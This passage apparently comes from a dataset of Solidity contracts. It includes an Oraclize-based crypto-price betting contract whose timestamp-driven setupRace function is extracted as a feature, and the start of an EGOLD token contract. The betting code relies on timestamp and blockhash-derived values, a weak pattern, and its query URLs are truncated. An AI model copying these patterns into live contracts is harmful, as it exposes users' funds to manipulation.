byte(cborlen).length;\n bytes memory res = new bytes(outputlen);\n while (byte(cborlen).length > ctr) {\n res[ctr] = byte(cborlen)[ctr];\n ctr++;\n }\n for (i = 0; i < arrlen; i++) {\n res[ctr] = 0x5F;\n ctr++;\n for (uint x = 0; x < elemArray[i].length; x++) {\n if (x % 23 == 0) {\n uint elemcborlen = elemArray[i].length - x >= 24 ? 23 : elemArray[i].length - x;\n elemcborlen += 0x40;\n uint lctr = ctr;\n while (byte(elemcborlen).length > ctr - lctr) {\n res[ctr] = byte(elemcborlen)[ctr - lctr];\n ctr++;\n }\n }\n res[ctr] = elemArray[i][x];\n ctr++;\n }\n res[ctr] = 0xFF;\n ctr++;\n }\n return res;\n }\n function ba2cbor(bytes[] arr) internal returns (bytes) {\n uint arrlen = arr.length;\n uint outputlen = 0;\n bytes[] memory elemArray = new bytes[](arrlen);\n for (uint i = 0; i < arrlen; i++) {\n elemArray[i] = (bytes(arr[i]));\n outputlen += elemArray[i].length + (elemArray[i].length - 1)/23 + 3;\n }\n uint ctr = 0;\n uint cborlen = arrlen + 0x80;\n outputlen += byte(cborlen).length;\n bytes memory res = new bytes(outputlen);\n while (byte(cborlen).length > ctr) {\n res[ctr] = byte(cborlen)[ctr];\n ctr++;\n }\n for (i = 0; i < arrlen; i++) {\n res[ctr] = 0x5F;\n ctr++;\n for (uint x = 0; x < elemArray[i].length; x++) {\n if (x % 23 == 0) {\n uint elemcborlen = elemArray[i].length - x >= 24 ? 23 : elemArray[i].length - x;\n elemcborlen += 0x40;\n uint lctr = ctr;\n while (byte(elemcborlen).length > ctr - lctr) {\n res[ctr] = byte(elemcborlen)[ctr - lctr];\n ctr++;\n }\n }\n res[ctr] = elemArray[i][x];\n ctr++;\n }\n res[ctr] = 0xFF;\n ctr++;\n }\n return res;\n }\n string oraclize_network_name;\n function oraclize_setNetworkName(string _network_name) internal {\n oraclize_network_name = _network_name;\n }\n function oraclize_getNetworkName() internal returns (string) {\n return oraclize_network_name;\n }\n function oraclize_newRandomDSQuery(uint _delay, uint _nbytes, uint _customGasLimit) internal returns (bytes32){\n if ((_nbytes == 0)||(_nbytes > 32)) throw;\n bytes memory nbytes = new bytes(1);\n nbytes[0] = byte(_nbytes);\n bytes memory unonce = new bytes(32);\n bytes memory sessionKeyHash = new bytes(32);\n bytes32 sessionKeyHash_bytes32 = oraclize_randomDS_getSessionPubKeyHash();\n assembly {\n mstore(unonce, 0x20)\n mstore(add(unonce, 0x20), xor(blockhash(sub(number, 1)), xor(coinbase, timestamp)))\n mstore(sessionKeyHash, 0x20)\n mstore(add(sessionKeyHash, 0x20), sessionKeyHash_bytes32)\n }\n bytes[3] memory args = [unonce, nbytes, sessionKeyHash];\n bytes32 queryId = oraclize_query(_delay, \"random\", args, _customGasLimit);\n oraclize_randomDS_setCommitment(queryId, sha3(bytes8(_delay), args[1], sha256(args[0]), args[2]));\n return queryId;\n }\n function oraclize_randomDS_setCommitment(bytes32 queryId, bytes32 commitment) internal {\n oraclize_randomDS_args[queryId] = commitment;\n }\n mapping(bytes32=>bytes32) oraclize_randomDS_args;\n mapping(bytes32=>bool) oraclize_randomDS_sessionKeysHashVerified;\n function verifySig(bytes32 tosignh, bytes dersig, bytes pubkey) internal returns (bool){\n bool sigok;\n address signer;\n bytes32 sigr;\n bytes32 sigs;\n bytes memory sigr_ = new bytes(32);\n uint offset = 4+(uint(dersig[3]) - 0x20);\n sigr_ = copyBytes(dersig, offset, 32, sigr_, 0);\n bytes memory sigs_ = new bytes(32);\n offset += 32 + 2;\n sigs_ = copyBytes(dersig, offset+(uint(dersig[offset-1]) - 0x20), 32, sigs_, 0);\n assembly {\n sigr := mload(add(sigr_, 32))\n sigs := mload(add(sigs_, 32))\n }\n (sigok, signer) = safer_ecrecover(tosignh, 27, sigr, sigs);\n if (address(sha3(pubkey)) == signer) return true;\n else {\n (sigok, signer) = safer_ecrecover(tosignh, 28, sigr, sigs);\n return (address(sha3(pubkey)) == signer);\n }\n }\n function oraclize_randomDS_proofVerify__sessionKeyValidity(bytes proof, uint sig2offset) internal returns (bool) {\n bool sigok;\n bytes memory sig2 = new bytes(uint(proof[sig2offset+1])+2);\n copyBytes(proof, sig2offset, sig2.length, sig2, 0);\n bytes memory appkey1_pubkey = new bytes(64);\n copyBytes(proof, 3+1, 64, appkey1_pubkey, 0);\n bytes memory tosign2 = new bytes(1+65+32);\n tosign2[0] = 1;\n copyBytes(proof, sig2offset-65, 65, tosign2, 1);\n bytes memory CODEHASH = hex\"fd94fa71bc0ba10d39d464d0d8f465efeef0a2764e3887fcc9df41ded20f505c\";\n copyBytes(CODEHASH, 0, 32, tosign2, 1+65);\n sigok = verifySig(sha256(tosign2), sig2, appkey1_pubkey);\n if (sigok == false) return false;\n bytes memory LEDGERKEY = hex\"7fb956469c5c9b89840d55b43537e66a98dd4811ea0a27224272c2e5622911e8537a2f8e86a46baec82864e98dd01e9ccc2f8bc5dfc9cbe5a91a290498dd96e4\";\n bytes memory tosign3 = new bytes(1+65);\n tosign3[0] = 0xFE;\n copyBytes(proof, 3, 65, tosign3, 1);\n bytes memory sig3 = new bytes(uint(proof[3+65+1])+2);\n copyBytes(proof, 3+65, sig3.length, sig3, 0);\n sigok = verifySig(sha256(tosign3), sig3, LEDGERKEY);\n return sigok;\n }\n modifier oraclize_randomDS_proofVerify(bytes32 _queryId, string _result, bytes _proof) {\n if ((_proof[0] != \"L\")||(_proof[1] != \"P\")||(_proof[2] != 1)) throw;\n bool proofVerified = oraclize_randomDS_proofVerify__main(_proof, _queryId, bytes(_result), oraclize_getNetworkName());\n if (proofVerified == false) throw;\n _;\n }\n function matchBytes32Prefix(bytes32 content, bytes prefix) internal returns (bool){\n bool match_ = true;\n for (var i=0; i<prefix.length; i++){\n if (content[i] != prefix[i]) match_ = false;\n }\n return match_;\n }\n function oraclize_randomDS_proofVerify__main(bytes proof, bytes32 queryId, bytes result, string context_name) internal returns (bool){\n bool checkok;\n uint ledgerProofLength = 3+65+(uint(proof[3+65+1])+2)+32;\n bytes memory keyhash = new bytes(32);\n copyBytes(proof, ledgerProofLength, 32, keyhash, 0);\n checkok = (sha3(keyhash) == sha3(sha256(context_name, queryId)));\n if (checkok == false) return false;\n bytes memory sig1 = new bytes(uint(proof[ledgerProofLength+(32+8+1+32)+1])+2);\n copyBytes(proof, ledgerProofLength+(32+8+1+32), sig1.length, sig1, 0);\n checkok = matchBytes32Prefix(sha256(sig1), result);\n if (checkok == false) return false;\n bytes memory commitmentSlice1 = new bytes(8+1+32);\n copyBytes(proof, ledgerProofLength+32, 8+1+32, commitmentSlice1, 0);\n bytes memory sessionPubkey = new bytes(64);\n uint sig2offset = ledgerProofLength+32+(8+1+32)+sig1.length+65;\n copyBytes(proof, sig2offset-64, 64, sessionPubkey, 0);\n bytes32 sessionPubkeyHash = sha256(sessionPubkey);\n if (oraclize_randomDS_args[queryId] == sha3(commitmentSlice1, sessionPubkeyHash)){\n delete oraclize_randomDS_args[queryId];\n } else return false;\n bytes memory tosign1 = new bytes(32+8+1+32);\n copyBytes(proof, ledgerProofLength, 32+8+1+32, tosign1, 0);\n checkok = verifySig(sha256(tosign1), sig1, sessionPubkey);\n if (checkok == false) return false;\n if (oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] == false){\n oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] = oraclize_randomDS_proofVerify__sessionKeyValidity(proof, sig2offset);\n }\n return oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash];\n }\n function copyBytes(bytes from, uint fromOffset, uint length, bytes to, uint toOffset) internal returns (bytes) {\n uint minLength = length + toOffset;\n if (to.length < minLength) {\n throw;\n }\n uint i = 32 + fromOffset;\n uint j = 32 + toOffset;\n while (i < (32 + fromOffset + length)) {\n assembly {\n let tmp := mload(add(from, i))\n mstore(add(to, j), tmp)\n }\n i += 32;\n j += 32;\n }\n return to;\n }\n function safer_ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal returns (bool, address) {\n bool ret;\n address addr;\n assembly {\n let size := mload(0x40)\n mstore(size, hash)\n mstore(add(size, 32), v)\n mstore(add(size, 64), r)\n mstore(add(size, 96), s)\n ret := call(3000, 1, 0, size, 128, size, 32)\n addr := mload(size)\n }\n return (ret, addr);\n }\n function ecrecovery(bytes32 hash, bytes sig) internal returns (bool, address) {\n bytes32 r;\n bytes32 s;\n uint8 v;\n if (sig.length != 65)\n return (false, 0);\n assembly {\n r := mload(add(sig, 32))\n s := mload(add(sig, 64))\n v := byte(0, mload(add(sig, 96)))\n }\n if (v < 27)\n v += 27;\n if (v != 27 && v != 28)\n return (false, 0);\n return safer_ecrecover(hash, v, r, s);\n }\n}\ncontract BettingControllerInterface {\n function remoteBettingClose() external;\n function depositHouseTakeout() external payable;\n}\ncontract Betting is usingOraclize {\n using SafeMath for uint256;\n uint countdown=3;\n address public owner;\n uint public winnerPoolTotal;\n string public constant version = \"0.2.2\";\n BettingControllerInterface internal bettingControllerInstance;\n struct chronus_info {\n bool betting_open;\n bool race_start;\n bool race_end;\n bool voided_bet;\n uint32 starting_time;\n uint32 betting_duration;\n uint32 race_duration;\n uint32 voided_timestamp;\n }\n struct horses_info{\n int64 BTC_delta;\n int64 ETH_delta;\n int64 LTC_delta;\n bytes32 BTC;\n bytes32 ETH;\n bytes32 LTC;\n uint customPreGasLimit;\n uint customPostGasLimit;\n }\n struct bet_info{\n bytes32 horse;\n uint amount;\n }\n struct coin_info{\n uint256 pre;\n uint256 post;\n uint160 total;\n uint32 count;\n bool price_check;\n bytes32 preOraclizeId;\n bytes32 postOraclizeId;\n }\n struct voter_info {\n uint160 total_bet;\n bool rewarded;\n mapping(bytes32=>uint) bets;\n }\n mapping (bytes32 => bytes32) oraclizeIndex;\n mapping (bytes32 => coin_info) coinIndex;\n mapping (address => voter_info) voterIndex;\n uint public total_reward;\n uint32 total_bettors;\n mapping (bytes32 => bool) public winner_horse;\n event newOraclizeQuery(string description);\n event newPriceTicker(uint price);\n event Deposit(address _from, uint256 _value, bytes32 _horse, uint256 _date);\n event Withdraw(address _to, uint256 _value);\n function Betting() public payable {\n oraclize_setProof(proofType_TLSNotary | proofStorage_IPFS);\n owner = msg.sender;\n oraclize_setCustomGasPrice(30000000000 wei);\n horses.BTC = bytes32(\"BTC\");\n horses.ETH = bytes32(\"ETH\");\n horses.LTC = bytes32(\"LTC\");\n horses.customPreGasLimit = 80000;\n horses.customPostGasLimit = 230000;\n bettingControllerInstance = BettingControllerInterface(owner);\n }\n horses_info public horses;\n chronus_info public chronus;\n modifier onlyOwner {\n require(owner == msg.sender);\n _;\n }\n modifier duringBetting {\n require(chronus.betting_open);\n require(now < chronus.starting_time + chronus.betting_duration);\n _;\n }\n modifier beforeBetting {\n require(!chronus.betting_open && !chronus.race_start);\n _;\n }\n modifier afterRace {\n require(chronus.race_end);\n _;\n }\n function changeOwnership(address _newOwner) onlyOwner external {\n owner = _newOwner;\n }\n function __callback(bytes32 myid, string result, bytes proof) public {\n require (msg.sender == oraclize_cbAddress());\n require (!chronus.race_end);\n bytes32 coin_pointer;\n chronus.race_start = true;\n chronus.betting_open = false;\n bettingControllerInstance.remoteBettingClose();\n coin_pointer = oraclizeIndex[myid];\n if (myid == coinIndex[coin_pointer].preOraclizeId) {\n if (coinIndex[coin_pointer].pre > 0) {\n } else if (now >= chronus.starting_time+chronus.betting_duration+ 60 minutes) {\n forceVoidRace();\n } else {\n coinIndex[coin_pointer].pre = stringToUintNormalize(result);\n emit newPriceTicker(coinIndex[coin_pointer].pre);\n }\n } else if (myid == coinIndex[coin_pointer].postOraclizeId){\n if (coinIndex[coin_pointer].pre > 0 ){\n if (coinIndex[coin_pointer].post > 0) {\n } else if (now >= chronus.starting_time+chronus.race_duration+ 60 minutes) {\n forceVoidRace();\n } else {\n coinIndex[coin_pointer].post = stringToUintNormalize(result);\n coinIndex[coin_pointer].price_check = true;\n emit newPriceTicker(coinIndex[coin_pointer].post);\n if (coinIndex[horses.ETH].price_check && coinIndex[horses.BTC].price_check && coinIndex[horses.LTC].price_check) {\n reward();\n }\n }\n } else {\n forceVoidRace();\n }\n }\n }\n function placeBet(bytes32 horse) external duringBetting payable {\n require(msg.value >= 0.01 ether);\n if (voterIndex[msg.sender].total_bet==0) {\n total_bettors+=1;\n }\n uint _newAmount = voterIndex[msg.sender].bets[horse] + msg.value;\n voterIndex[msg.sender].bets[horse] = _newAmount;\n voterIndex[msg.sender].total_bet += uint160(msg.value);\n uint160 _newTotal = coinIndex[horse].total + uint160(msg.value);\n uint32 _newCount = coinIndex[horse].count + 1;\n coinIndex[horse].total = _newTotal;\n coinIndex[horse].count = _newCount;\n emit Deposit(msg.sender, msg.value, horse, now);\n }\n function () private payable {}\n function setupRace(uint delay, uint locking_duration) onlyOwner beforeBetting public payable returns(bool) {\n if (oraclize_getPrice(\"URL\" , horses.customPreGasLimit)*3 + oraclize_getPrice(\"URL\", horses.customPostGasLimit)*3 > address(this).balance) {\n emit newOraclizeQuery(\"Oraclize query was NOT sent, please add some ETH to cover for the query fee\");\n return false;\n } else {\n chronus.starting_time = uint32(block.timestamp);\n chronus.betting_open = true;\n bytes32 temp_ID;\n emit newOraclizeQuery(\"Oraclize query was sent, standing by for the answer..\");\n chronus.betting_duration = uint32(delay);\n temp_ID = oraclize_query(delay, \"URL\", \"json(https:\n oraclizeIndex[temp_ID] = horses.ETH;\n coinIndex[horses.ETH].preOraclizeId = temp_ID;\n temp_ID = oraclize_query(delay, \"URL\", \"json(https:\n oraclizeIndex[temp_ID] = horses.LTC;\n coinIndex[horses.LTC].preOraclizeId = temp_ID;\n temp_ID = oraclize_query(delay, \"URL\", \"json(https:\n oraclizeIndex[temp_ID] = horses.BTC;\n coinIndex[horses.BTC].preOraclizeId = temp_ID;\n delay = delay.add(locking_duration);\n temp_ID = oraclize_query(delay, \"URL\", \"json(https:\n oraclizeIndex[temp_ID] = horses.ETH;\n coinIndex[horses.ETH].postOraclizeId = temp_ID;\n temp_ID = oraclize_query(delay, \"URL\", \"json(https:\n oraclizeIndex[temp_ID] = horses.LTC;\n coinIndex[horses.LTC].postOraclizeId = temp_ID;\n temp_ID = oraclize_query(delay, \"URL\", \"json(https:\n oraclizeIndex[temp_ID] = horses.BTC;\n coinIndex[horses.BTC].postOraclizeId = temp_ID;\n chronus.race_duration = uint32(delay);\n return true;\n }\n }\n function reward() internal {\n horses.BTC_delta = int64(coinIndex[horses.BTC].post - coinIndex[horses.BTC].pre)*100000/int64(coinIndex[horses.BTC].pre);\n horses.ETH_delta = int64(coinIndex[horses.ETH].post - coinIndex[horses.ETH].pre)*100000/int64(coinIndex[horses.ETH].pre);\n horses.LTC_delta = int64(coinIndex[horses.LTC].post - coinIndex[horses.LTC].pre)*100000/int64(coinIndex[horses.LTC].pre);\n total_reward = (coinIndex[horses.BTC].total) + (coinIndex[horses.ETH].total) + (coinIndex[horses.LTC].total);\n if (total_bettors <= 1) {\n forceVoidRace();\n } else {\n uint house_fee = total_reward.mul(5).div(100);\n require(house_fee < address(this).balance);\n total_reward = total_reward.sub(house_fee);\n bettingControllerInstance.depositHouseTakeout.value(house_fee)();\n }\n if (horses.BTC_delta > horses.ETH_delta) {\n if (horses.BTC_delta > horses.LTC_delta) {\n winner_horse[horses.BTC] = true;\n winnerPoolTotal = coinIndex[horses.BTC].total;\n }\n else if(horses.LTC_delta > horses.BTC_delta) {\n winner_horse[horses.LTC] = true;\n winnerPoolTotal = coinIndex[horses.LTC].total;\n } else {\n winner_horse[horses.BTC] = true;\n winner_horse[horses.LTC] = true;\n winnerPoolTotal = coinIndex[horses.BTC].total + (coinIndex[horses.LTC].total);\n }\n } else if(horses.ETH_delta > horses.BTC_delta) {\n if (horses.ETH_delta > horses.LTC_delta) {\n winner_horse[horses.ETH] = true;\n winnerPoolTotal = coinIndex[horses.ETH].total;\n }\n else if (horses.LTC_delta > horses.ETH_delta) {\n winner_horse[horses.LTC] = true;\n winnerPoolTotal = coinIndex[horses.LTC].total;\n } else {\n winner_horse[horses.ETH] = true;\n winner_horse[horses.LTC] = true;\n winnerPoolTotal = coinIndex[horses.ETH].total + (coinIndex[horses.LTC].total);\n }\n } else {\n if (horses.LTC_delta > horses.ETH_delta) {\n winner_horse[horses.LTC] = true;\n winnerPoolTotal = coinIndex[horses.LTC].total;\n } else if(horses.LTC_delta < horses.ETH_delta){\n winner_horse[horses.ETH] = true;\n winner_horse[horses.BTC] = true;\n winnerPoolTotal = coinIndex[horses.ETH].total + (coinIndex[horses.BTC].total);\n } else {\n winner_horse[horses.LTC] = true;\n winner_horse[horses.ETH] = true;\n winner_horse[horses.BTC] = true;\n winnerPoolTotal = coinIndex[horses.ETH].total + (coinIndex[horses.BTC].total) + (coinIndex[horses.LTC].total);\n }\n }\n chronus.race_end = true;\n }\n function calculateReward(address candidate) internal afterRace constant returns(uint winner_reward) {\n voter_info storage bettor = voterIndex[candidate];\n if(chronus.voided_bet) {\n winner_reward = bettor.total_bet;\n } else {\n uint winning_bet_total;\n if(winner_horse[horses.BTC]) {\n winning_bet_total += bettor.bets[horses.BTC];\n } if(winner_horse[horses.ETH]) {\n winning_bet_total += bettor.bets[horses.ETH];\n } if(winner_horse[horses.LTC]) {\n winning_bet_total += bettor.bets[horses.LTC];\n }\n winner_reward += (((total_reward.mul(10000000)).div(winnerPoolTotal)).mul(winning_bet_total)).div(10000000);\n }\n }\n function checkReward() afterRace external constant returns (uint) {\n require(!voterIndex[msg.sender].rewarded);\n return calculateReward(msg.sender);\n }\n function claim_reward() afterRace external {\n require(!voterIndex[msg.sender].rewarded);\n uint transfer_amount = calculateReward(msg.sender);\n require(address(this).balance >= transfer_amount);\n voterIndex[msg.sender].rewarded = true;\n msg.sender.transfer(transfer_amount);\n emit Withdraw(msg.sender, transfer_amount);\n }\n function forceVoidRace() internal {\n chronus.voided_bet=true;\n chronus.race_end = true;\n chronus.voided_timestamp=uint32(now);\n }\n function stringToUintNormalize(string s) internal pure returns (uint result) {\n uint p =2;\n bool precision=false;\n bytes memory b = bytes(s);\n uint i;\n result = 0;\n for (i = 0; i < b.length; i++) {\n if (precision) {p = p-1;}\n if (uint(b[i]) == 46){precision = true;}\n uint c = uint(b[i]);\n if (c >= 48 && c <= 57) {result = result * 10 + (c - 48);}\n if (precision && p == 0){return result;}\n }\n while (p!=0) {\n result = result*10;\n p=p-1;\n }\n }\n function getCoinIndex(bytes32 index, address candidate) external constant returns (uint, uint, uint, bool, uint) {\n return (coinIndex[index].total, coinIndex[index].pre, coinIndex[index].post, coinIndex[index].price_check, voterIndex[candidate].bets[index]);\n }\n function reward_total() external constant returns (uint) {\n return ((coinIndex[horses.BTC].total) + (coinIndex[horses.ETH].total) + (coinIndex[horses.LTC].total));\n }\n function refund() external onlyOwner {\n require(now > chronus.starting_time + chronus.race_duration);\n require((chronus.betting_open && !chronus.race_start)\n || (chronus.race_start && !chronus.race_end));\n chronus.voided_bet = true;\n chronus.race_end = true;\n chronus.voided_timestamp=uint32(now);\n bettingControllerInstance.remoteBettingClose();\n }\n function recovery() external onlyOwner{\n require((chronus.race_end && now > chronus.starting_time + chronus.race_duration + (30 days))\n || (chronus.voided_bet && now > chronus.voided_timestamp + (30 days)));\n bettingControllerInstance.depositHouseTakeout.value(address(this).balance)();\n }\n}",
  "extract_feature": [
    "function setupRace(uint delay, uint locking_duration) onlyOwner beforeBetting public payable returns(bool) {\nif (oraclize_getPrice(\"URL\" , horses.customPreGasLimit)*3 + oraclize_getPrice(\"URL\", horses.customPostGasLimit)*3 > address(this).balance) {\nemit newOraclizeQuery(\"Oraclize query was NOT sent, please add some ETH to cover for the query fee\");\nreturn false;\n} else {\nchronus.starting_time = uint32(block.timestamp);\nchronus.betting_open = true;\nbytes32 temp_ID;\nemit newOraclizeQuery(\"Oraclize query was sent, standing by for the answer..\");\nchronus.betting_duration = uint32(delay);\ntemp_ID = oraclize_query(delay, \"URL\", \"json(https:\noraclizeIndex[temp_ID] = horses.ETH;\ncoinIndex[horses.ETH].preOraclizeId = temp_ID;\ntemp_ID = oraclize_query(delay, \"URL\", \"json(https:\noraclizeIndex[temp_ID] = horses.LTC;\ncoinIndex[horses.LTC].preOraclizeId = temp_ID;\ntemp_ID = oraclize_query(delay, \"URL\", \"json(https:\noraclizeIndex[temp_ID] = horses.BTC;\ncoinIndex[horses.BTC].preOraclizeId = temp_ID;\ndelay = delay.add(locking_duration);\ntemp_ID = oraclize_query(delay, \"URL\", \"json(https:\noraclizeIndex[temp_ID] = horses.ETH;\ncoinIndex[horses.ETH].postOraclizeId = temp_ID;\ntemp_ID = oraclize_query(delay, \"URL\", \"json(https:\noraclizeIndex[temp_ID] = horses.LTC;\ncoinIndex[horses.LTC].postOraclizeId = temp_ID;\ntemp_ID = oraclize_query(delay, \"URL\", \"json(https:\noraclizeIndex[temp_ID] = horses.BTC;\ncoinIndex[horses.BTC].postOraclizeId = temp_ID;\nchronus.race_duration = uint32(delay);\nreturn true;\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaacfa0e1460cdfa1f93"
  },
  "filename": "9759.sol",
  "content": "pragma solidity ^0.4.20;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract MintableToken is StandardToken, Ownable {\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n bool public mintingFinished = false;\n modifier canMint() {\n require(!mintingFinished);\n _;\n }\n function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) {\n totalSupply = totalSupply.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n Mint(_to, _amount);\n Transfer(address(0), _to, _amount);\n return true;\n }\n function finishMinting() onlyOwner canMint public returns (bool) {\n mintingFinished = true;\n MintFinished();\n return true;\n }\n}\ncontract FreezableToken is StandardToken {\n mapping (bytes32 => uint64) internal chains;\n mapping (bytes32 => uint) internal freezings;\n mapping (address => uint) internal freezingBalance;\n event Freezed(address indexed to, uint64 release, uint amount);\n event Released(address indexed owner, uint amount);\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return super.balanceOf(_owner) + freezingBalance[_owner];\n }\n function actualBalanceOf(address _owner) public view returns (uint256 balance) {\n return super.balanceOf(_owner);\n }\n function freezingBalanceOf(address _owner) public view returns (uint256 balance) {\n return freezingBalance[_owner];\n }\n function freezingCount(address _addr) public view returns (uint count) {\n uint64 release = chains[toKey(_addr, 0)];\n while (release != 0) {\n count ++;\n release = chains[toKey(_addr, release)];\n }\n }\n function getFreezing(address _addr, uint _index) public view returns (uint64 _release, uint _balance) {\n for (uint i = 0; i < _index + 1; i ++) {\n _release = chains[toKey(_addr, _release)];\n if (_release == 0) {\n return;\n }\n }\n _balance = freezings[toKey(_addr, _release)];\n }\n function freezeTo(address _to, uint _amount, uint64 _until) public {\n require(_to != address(0));\n require(_amount <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_amount);\n bytes32 currentKey = toKey(_to, _until);\n freezings[currentKey] = freezings[currentKey].add(_amount);\n freezingBalance[_to] = freezingBalance[_to].add(_amount);\n freeze(_to, _until);\n Freezed(_to, _until, _amount);\n }\n function releaseOnce() public {\n bytes32 headKey = toKey(msg.sender, 0);\n uint64 head = chains[headKey];\n require(head != 0);\n require(uint64(block.timestamp) > head);\n bytes32 currentKey = toKey(msg.sender, head);\n uint64 next = chains[currentKey];\n uint amount = freezings[currentKey];\n delete freezings[currentKey];\n balances[msg.sender] = balances[msg.sender].add(amount);\n freezingBalance[msg.sender] = freezingBalance[msg.sender].sub(amount);\n if (next == 0) {\n delete chains[headKey];\n }\n else {\n chains[headKey] = next;\n delete chains[currentKey];\n }\n Released(msg.sender, amount);\n }\n function releaseAll() public returns (uint tokens) {\n uint release;\n uint balance;\n (release, balance) = getFreezing(msg.sender, 0);\n while (release != 0 && block.timestamp > release) {\n releaseOnce();\n tokens += balance;\n (release, balance) = getFreezing(msg.sender, 0);\n }\n }\n function toKey(address _addr, uint _release) internal pure returns (bytes32 result) {\n result = 0x5749534800000000000000000000000000000000000000000000000000000000;\n assembly {\n result := or(result, mul(_addr, 0x10000000000000000))\n result := or(result, _release)\n }\n }\n function freeze(address _to, uint64 _until) internal {\n require(_until > block.timestamp);\n bytes32 key = toKey(_to, _until);\n bytes32 parentKey = toKey(_to, uint64(0));\n uint64 next = chains[parentKey];\n if (next == 0) {\n chains[parentKey] = _until;\n return;\n }\n bytes32 nextKey = toKey(_to, next);\n uint parent;\n while (next != 0 && _until > next) {\n parent = next;\n parentKey = nextKey;\n next = chains[nextKey];\n nextKey = toKey(_to, next);\n }\n if (_until == next) {\n return;\n }\n if (next != 0) {\n chains[key] = next;\n }\n chains[parentKey] = _until;\n }\n}\ncontract ERC223Receiver {\n function tokenFallback(address _from, uint _value, bytes _data) public;\n}\ncontract ERC223Basic is ERC20Basic {\n function transfer(address to, uint value, bytes data) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint value, bytes data);\n}\ncontract SuccessfulERC223Receiver is ERC223Receiver {\n event Invoked(address from, uint value, bytes data);\n function tokenFallback(address _from, uint _value, bytes _data) public {\n Invoked(_from, _value, _data);\n }\n}\ncontract FailingERC223Receiver is ERC223Receiver {\n function tokenFallback(address, uint, bytes) public {\n revert();\n }\n}\ncontract ERC223ReceiverWithoutTokenFallback {\n}\ncontract BurnableToken is StandardToken {\n event Burn(address indexed burner, uint256 value);\n function burn(uint256 _value) public {\n require(_value > 0);\n require(_value <= balances[msg.sender]);\n address burner = msg.sender;\n balances[burner] = balances[burner].sub(_value);\n totalSupply = totalSupply.sub(_value);\n Burn(burner, _value);\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n Unpause();\n }\n}\ncontract FreezableMintableToken is FreezableToken, MintableToken {\n function mintAndFreeze(address _to, uint _amount, uint64 _until) onlyOwner canMint public returns (bool) {\n totalSupply = totalSupply.add(_amount);\n bytes32 currentKey = toKey(_to, _until);\n freezings[currentKey] = freezings[currentKey].add(_amount);\n freezingBalance[_to] = freezingBalance[_to].add(_amount);\n freeze(_to, _until);\n Mint(_to, _amount);\n Freezed(_to, _until, _amount);\n return true;\n }\n}\ncontract Consts {\n uint constant TOKEN_DECIMALS = 18;\n uint8 constant TOKEN_DECIMALS_UINT8 = 18;\n uint constant TOKEN_DECIMAL_MULTIPLIER = 10 ** TOKEN_DECIMALS;\n string constant TOKEN_NAME = \"EGOLD\";\n string constant TOKEN_SYMBOL = \"EGD\";\n bool constant PAUSED = false;\n address constant TARGET_USER = 